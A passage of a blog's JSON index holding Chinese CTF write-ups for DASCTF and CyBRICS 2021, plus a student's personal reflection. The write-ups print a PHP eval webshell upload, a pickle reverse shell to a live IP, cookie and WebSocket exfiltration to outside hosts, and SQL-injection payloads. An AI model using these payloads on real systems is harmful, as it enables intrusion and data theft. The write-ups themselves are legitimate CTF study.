就可以任意控制参数达到二次注入的效果\n公钥在网页源码中已经给出，数据表的结果也已经在Hint中了，用cyberchef一把梭\n重新注册个账号，只修改一下username即可 passwd不用变 将pay_password修改为上面生成的值，登陆后即可看到flag\njj\u0026rsquo;s camera  jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点\nHint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应\n 也是已有的东西 但是比赛的时候我没搜到源码（尴尬）源码在这里：在吗宝贝？你点开这个网址看看[打开网站偷拍照片] | 点开一个网址我被记录了ip还偷拍了照片\n（我这个智商真的是负数起步的 上面这两个帖子我看了好久 才反应过来这个钓鱼网站是要干啥。。。。\n前端是一个链接生成站 中间可以加一个id的参数，访问后会自动调用摄像头（但是会有个提示的弹窗），先拍照再相应链接，之后可以到先前的页面查看拍到的照片，数据以post的形式上传至/qbl.php?id=xxx\u0026amp;url=xxx，这是qbl.php的源码\n\u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//存放在当前目录的img文件夹下 if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt;file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了\n/qbl.php?id=wuhu.php%00a\u0026amp;url=http://baidu.com POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg== 参考：wp\neasyweb 有一个docker的附件和一些源码\n首页就是个白底黑字的Hello World，审下源码\n直接打断点调试一下（因为这里涉及到session的调用 所以在.vscode中的launch.json处添加一个configuration: \u0026quot;justMyCode\u0026quot;: false这样可以在调用堆栈处看到完整的调用情况\n可以注意到每次刷新之后 session的值都会发生变化，调试的时候可以看到生成这个session时调用了dumps方法，所以这个题就是反序列化的套路啦\npayload有两种吧 反弹shell 或者构造post/get请求到自己可以接收到的平台上，也都是常规做法\nclass A: def __reduce__(self): cmd = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/175.24.73.30/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; s=\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;{}\u0026#39;).read()\u0026#34;.format(cmd) return (eval,(s,)) #reduce必须返回元组或字符串 def hello_world(request): request.session[\u0026#34;233\u0026#34;] = \u0026#34;2333\u0026#34; request.session[\u0026#34;a\u0026#34;] = A() return Response(\u0026#39;Hello World!\u0026#39;) 构造请求的话还是老朋友~~ burp collaborator~~\ncurl \u0026#34;xxxxxx.burpcollaborator.net/`readflag`\u0026#34; 参考：wp\neasyjava java 根本不会\n放个参考链接 溜了：wp1 wp2\n 最近在总结反序列化有关的东西，想把php, python, java的反序列化 做过的东西总结总结，但还是我想得太简单了 一个php的反序列化就有好多好多东西（装死）\n争取早收工吧，还有upload, xss, csrf, sqli\u0026hellip;\u0026hellip;等着总结 还有超级多东西要学要看\n学习好耶！σ`∀´)\n","date":"2021-08-05T23:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/","section":"posts","tags":["wp"],"title":"DasCTF0721 Wp"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts)  Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! There’s a flag there, and it’s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 — looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely\n Scanner (rebyC, Baby, 50 pts)  Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\n 不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面\n首先用Gif Super把帧间隔调为300ms，然后裁剪出中间有用的部分 放入GIF动态图片分解中看结果 都有在线工具就很方便\n所以这个破玩意到底是啥？猪？还是刺猬？ 别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone\u0026hellip;. 最后一个是二维码 比较麻烦\n再稍微调整一下尺寸，扫描就行了rm -rf’er (CTB, Baby, 166 pts)  Author: Vlad Roskov (@mrvos)\nAlarm! We accidentally did rm -rf /* on a very important server. Now all that’s left is one shell session.\nssh rmrfer@178.154.210.26 Password: sa7Neiyi Rescue the flag.txt file from one of the directories by only using your shell\nAdded at 13:45 — frequent question: yes, if you found flag.txt, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you\n 这个题 emmmmm 只要ssh一连接就会自动执行rm -rf /*的指令，当反应过来的时候系统已经删的连ls指令都不剩了\n先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了rm -rf /*，之后就可以顺畅的穿梭于这个buildbox之间拿flag了\n预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成\u0026quot;read\u0026quot;的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中echo $\u0026lt;命令相当于read函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload (echo \u0026quot;$\u0026lt;\u0026quot;) \u0026lt; /etc/ctf/flag.txt，即 读取flag.txt并输出\nAd Network (Web, Baby, 50 pts)  Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\n 这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？\nemmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图 这个图在昨天做的时候看到， 内容是 awesome ad from adnetwork，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的\u0026hellip;\u0026hellip; （都怪edge!!!\n点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\n比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts)  Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project — ⚐ The Flag\nAnnouncement website\n 简约漂亮的前端\n有个输入邮箱的框，提交会发送一个post请求：digest=xxxx\u0026amp;email=xxxx 尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(\u0026lsquo;1@1.com\u0026rsquo;) 随email而改变，尝试注入\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email='or'1\t// 回显正常 无报错 digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1')#\t// 报错：Something went wrong during database insert: Column count doesn't match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1',1)#\t// 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1 确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？\ninsert into table_name (email, timestamp) values (email, now()); 可利用的部分是可以插入的email，报错注入\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: '~announcement' digest=c9f14624524736a74164cc6024fdefce\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~emails,logs' digest=94707222b90505ab0aa5e1fd3916e77d\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~log' digest=66bf6db11d9bee8e897b874a430f5704\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}' 没什么好说的，经典报错注入流程：确定字段数-\u0026gt;爆数据库名(announcement)-\u0026gt;表名(emails, logs)-\u0026gt;字段名(log)-\u0026gt;具体数据 拿flag\nMultichat (Web, Medium, 138 pts)  Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: p32vhJKrnx_hajUc8nLTFw\n 聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样\n抓包，看到了Connection: Upgrade Upgrade: websocket，这个聊天室是建立了一个websocket连接\n（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面\n链接里的一个csrf攻击的实例跟这个有点像了\n但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（Admin and tech support are members of a secret chat room.）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag\n（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）\n5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是来自w\u0026amp;m的脚本\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var conn; function connect() { conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onclose = function (evt) { var item = \u0026#34;\u0026#34;; if (evt.code === 1003) { item = `Status: ${evt.reason}`; } else { item = \u0026#34;Connection closed.\u0026#34;; } fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(item)) }; conn.onopen = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(\u0026#34;connected\u0026#34;)) }; conn.onmessage = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(evt.data)) }; function b(){ conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;) } setTimeout(b,2000); } window.onload = function () { connect(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; 或者非预期解：在url部分进行xss，payload: javascript:location.href='http://vps/?cookie='+document.cookie（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag\n参考：HTML5 WebSocket | WebSocket安全问题分析 WebSocket断开原因分析 | Request.mode 使用 Fetch | WorkerOrGlobalScope.fetch() | Burpsuite Collaborator模块详解 | Running Your Instance of Burp Collaborator Server（列入待完成计划\nASCII Terminal (Network, Baby, 116 pts)  Author: Artur Khanov (@awengar)\nAt 138.68.83.253:3333 you have an ASCII terminal. It really works, check with the id command\n nc连上以后可以看到一个bash $，题目的提示是\u0026quot;ASCII termial\u0026quot;\n把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具\ntoilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如\n可以玩出很多花样~\n书归正题，这里使用toilet -f bigascii9 +command的命令生成结果，将空格换为 .再发送即可\ntoilet -f bigascii9 ls \u0026gt; ls.txt cat ls.txt | nc 138.68.83.253 3333 \u0026gt; ls_result.txt toilet -f bigascii9 'cat flag.txt' \u0026gt; cat.txt cat cat.txt | nc 138.68.83.253 2333 \u0026gt; flag.txt （值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的%s/\\s/./g命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下\n最后flag：cybrics{T3553R4C7_15_GOOD}\n————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到录播视频中看\n参考：调皮捣蛋的Linux下有趣终端的合集 | Linux Fun - 如何在终端中创建ASCII文本横幅 | Neofetch - 显示具有分发标志的Linux系统信息\nLX-100 (Network, Easy, 192 pts)  Author: Vlad Roskov (@mrvos)\nWe were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.\nAnyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.\nlx100.pcap\n （说实话，pacp包是真的不会看TAT\n首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件 （以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是官方视频中确实这样可以成功 emmmm\ntshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data \u0026gt; hex.txt php -a foreach(file(\u0026quot;hex.txt\u0026quot;)as $i =\u0026gt; $ln) {file_put_contents(\u0026quot;frame$i.jpg\u0026quot;,hex2bin(trim($ln)));} （以下是在别的wp中看到的py脚本： 可成功复现 导出455张jpg图\nimport pyshark cap = pyshark.FileCapture(\u0026#39;lx100.pcap\u0026#39;) count = 0 for packet in cap: if \u0026#34;UDP\u0026#34; in packet and int(packet[\u0026#39;udp\u0026#39;].srcport) == 65415: count = count + 1 udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find(\u0026#39;ffd8ffdb\u0026#39;):]) file_out = open(\u0026#39;out_files/\u0026#39; + str(count) + \u0026#39;_packet.jpg\u0026#39;, \u0026#39;wb\u0026#39;) file_out.write(udp_bytes) 放大 再放大 每一根 最后的flag是 cybrics{Lost_Secrets_In_The_AIr}\nlocalhost (Network, Hard, 267 pts)  Author: Vlad Roskov (@mrvos)\nRemember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.\nssh localhost@109.233.61.10 Password: ohx7eeQu Your team token \u0026gt; Sw0T5cecsfJfaKApOiKzsA\n 先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水\n自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段nmap -sS -Pn 10.193.10.7/24\n发现10.193.10.180的80端口开放，用curl访问\n提示Flag-containing-Records 接着访问两个超链接的内容\ncurl 10.193.10.180/redis.conf是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：\nbind 127.0.0.1 protected-mod yes port 6379 curl 10.193.10.180/sysctl.conf也是相关的配置文件 只有一句没被注释\nnet.ipv4.conf.all.route_localnet=1 查google，发现了这些：net.ipv4.conf.all.route_localnet=1 opens security issue #90259 | POC-2020-8558\n是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：\n In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the net.ipv4.conf.all.route_localnet=1 sysctl setting. According to the kernel documentation, this setting makes the kernel \u0026ldquo;not consider loopback addresses as martian\u0026rdquo; \u0026ndash; a consequence of which is that they could be accessed by other nodes on the network. That\u0026rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!\n\u0026hellip;\u0026hellip;\nA normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting net.ipv4.conf.all.route_localnet=1 changes that \u0026ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.\nSo, if an attacker has a local connection to a target node with net.ipv4.conf.all.route_localnet=1, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.\nNote that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker\u0026rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.\n （不得不说ipv4当初把整个127.0.0.0/8的地址都给了本地回环用真的是太慷慨了\u0026hellip;\u0026hellip; 到ipv6就只有一个:: 1\n在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明\n tst-2020-8558.py Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to 127.0.0.1 via your target, and looks to see if there is a reply.\npoc-2020-8558.py Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default). Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal. Because this script uses raw sockets to send and receive the \u0026ldquo;localhost\u0026rdquo; packets, it works fine inside a normal unprivileged container.\n 因为需要nc 所以另开一个shell\n参考：wp | 为什么整个127.*网段都被拿来当做环回地址了？\n 本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，此处是参考wp\n道阻且长呀，暑假要好好努力咯 (つд⊂) 参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆\n","date":"2021-07-29T17:02:12+08:00","permalink":"https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/","section":"posts","tags":["wp"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"欢迎互换友链！！欢迎扩列吹水！！!\nᕕ(ᐛ)ᕗ\n  eeee - V\u0026amp;N知名男酮 - pwn deebato - crypto  ","date":"2021-07-27T14:37:22+08:00","permalink":"https://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":[],"contents":"时间飞逝，一眨眼进入大学已经快一年了，但时常觉得报道入校就在昨天。\n去年12月开始接触到ctf，0基础，每周末做一做ctfhub的技能树，当时对整个计算机世界算是完全小白 遇到一个名词就要查一查什么意思，经常是看个半天还是一知半解，做题也只能机械的重复一下搜到的wp里的步骤，有样学样。也就坚持了1个月，就开始复习期末考试→考试→放假，寒假算是在家里躺过去的，每天宅着看看剧 刷刷手机，碌碌无为的什么都不想干；临近开学了，才如梦初醒般的悔悟，看了两本书，捣鼓了下手机，浅浅地了解了一下安卓的刷机和搞机的相关知识。\n三月底正式开学，四月初开始把“荒废”的ctf题继续捡起来，从之前的每周末做做题变成了每天晚上都拿出时间来学习。当时虽然对安全还是懵懂的认识，但是我的直觉告诉我这就是我的爱好，是能带来成就感和快乐的东西，我愿意花时间去琢磨它。也是四月，看了《网络是怎样连接的》《图解http》和《图解tcp/ip》，正式的了解了一下计网（虽然也只是个入门）；做完ctfhub的web部分之后，也算是对ctf里web部分的基本类型都见过了，开始在buuoj上真正做一些ctf的题。\n然而到真正到做ctf题的时候发现自己又是那样的渺小，拿到一道题也只能抓包、扫目录，好一点的能拿到泄露的源码，可是到代码审计又是完全的稀烂，js不会看 php不会看 java更不会看，甚至连复杂一点的python也不会看，一个类型的题 稍微变个花样 拐个弯就又看不懂了，一副痛苦面具；现在回过头来看 很庆幸当时即使遇到了种种问题也没打退堂鼓，没见过的函数就去搜文档 看用法，没见过的知识点就去搜相关资料，看不懂的题就多看几个不同的wp 然后复现 用自己的话再整理出来 打好tag放到notion上。\n很快到了五月，五月初把老旧厚重的电脑换掉了，新上手的装备提升了不少学习的舒适感；这段时间也夹杂着做了一点burpsuite portswigger的题（这块做的不太扎实，而且当时做的时候没有用图床 笔记里的图片也都丢掉了 之后得回过头来重新看看），也夹杂做了几个单独类型的靶场；然后是两周难熬的军训。虽然军训难熬，但是过的真的很快乐。这里就是懂的都懂了，不详说。开心快乐的几个月，我将永远铭记。\n军训回来以后就六月了，算是进入正轨？不知道这样说是不是很合适，对很多题目也是一回生 二回熟，从一开始的完全不知道从哪里下手到稍微能分析一点（虽然还是不能脱离wp独自行走），可能对于一些有天赋的大佬来说这些轻轻松松，我可能花几个小时能搞懂的东西只需要别人一个小时能理解透，但是我已经很满意了，那句话怎么说？“进一寸有一寸的欢喜”，或许就是这样吧，虽然每天是笨拙地学着，但也开心。\n也是六月之后，开始关注漏洞、渗透、攻防等等安全方面核心向的一些东西，开始每天抽出时间看安全类的公众号文章，一开始只是不明觉厉——哇 虽然看不懂是在干什么 但是好nb 好厉害，看的多了一点以后开始慢慢明白那些高大上的名词是什么意思，原来网络安全的世界是那么让人着迷。也开始正式接触ctf比赛（虽然也就是进去签个到的水平……），开始做vulnhub的靶机，开始复盘之前做过的题，慢慢的 旁征博引 一点点的丰富知识体系。\n现在已经是7月中旬了，很快就要从大一的菜鸡变为大二的菜鸡了，回顾这一年的学习和生活也是感慨良多。满打满算，接触安全是不到四个月吧，算是也不短了，可是认真捋一下整个的过程 又是漏洞百出——代码审计能力稀烂，经常分析不出来问题所在的地方；逻辑链条一长的题目就思维呆滞 总是会下意识地想放弃 这真的不是个好现象；sqli和upload类的题做了不少，但还是不能自己独立的 完全不参考别人的wp完成一整个分析过程；对于python的掌握不够好，明显反应在任何需要编写py脚本的题目上；对一些知识点——不说一些了，可以说是全部的东西的了解和认识都还是浅尝辄止，停留在纸面上的花架子，比如反序列化 比如目录遍历，脑子里只能说有个残存的印象 可真正给我个这样的题 还是不能说轻松上手，甚至是对一些概念还理不清楚，学的东西可能看起来是有个样子 但我心里清楚 差的还太远太远，甚至完全没有到能自信的跟别人说“我在学ctf 我在学安全”的程度。\n学不动的时候经常会看大佬的博客，看看别人的学习经历是什么样的。之前还会拿年龄做自我开脱的借口，还小，还早，还都来得及，可是越学 越发现要去点亮的技能树越是枝繁叶茂，厚厚的树冠仿佛要遮天蔽日般——要学java 提高代码审计能力 常见的漏洞类型要做到心里有数，要把之前做过的题多温习 多想多练多看，要做到真正的掌握知识 而不是记住这个东西叫什么 徒有其表，要多写写代码 写代码的基本功太差那肯定是走不远，最感兴趣的渗透和漏洞方面的东西更要多看 可以本地复现的不要懒；即便如此，也有不少阳光能够穿透树叶交叠之处，温暖的洒落。可能我真的不是所谓的天赋型选手，只不过是万千平平无奇的普通人之一，学习能力也就是个中等水平，但是我相信量变引起质变，相信持之以恒的努力会带来改变，更何况这还是我非常喜欢的事情；可能我即使努力四年 也达不到那些大佬半年就能达到的高度，但是不重要 学习嘛 就是不会才要学，就算学不会也不是什么丢人的事情，日拱一卒，功不唐捐。\n再一抬眼，暑假就要来了。要干的和要学的很多，千头万绪的；但也算是有明确的方向，人还是忙起来好。下学期就大二了，再一晃就大三了，自己是不想考研的，但是到了大四 自己的实力够进大厂吗？会不会毕业即失业？我不知道，但谁又知道呢？未来的事情预测不了，能做的只有把握当下。\n大一就要结束了，在图书馆常坐的座位上，打开typora，草草的复盘了一下整个一学年。上一次写复盘总结还是六月初 刚军训完，一个有点迷茫的时候。如果跟0基础的自己比起来，可以说是成长了不少；但我知道这还远远达不到平均线，差的还太多，是完全拿不出手的程度。但总的来说，还算有一点点小小的收获，希望自己在之后的日子里也能坚守住初心，保持对安全的热爱，保持学习的热情，也保持对美好生活的热忱；希望能够变得越来越强大；希望大二的寒假写复盘总结的时候能有更多可写的 更多开心的事情。\n：）\n 之后的总结呀，一些随笔也都会放到小站上，不过一部分就不放到公开展示的posts上了，url就是/:year/:month/:day/:slug/的形式，算是变相的加密博客了叭？不过应该也防不住什么捏（\n","date":"2021-07-22T18:27:39+08:00","permalink":"https://amiaaaz.github.io/2021/07/22/0920-0721-summary/","section":"secrets","tags":[],"title":"一点小小的总结（"}]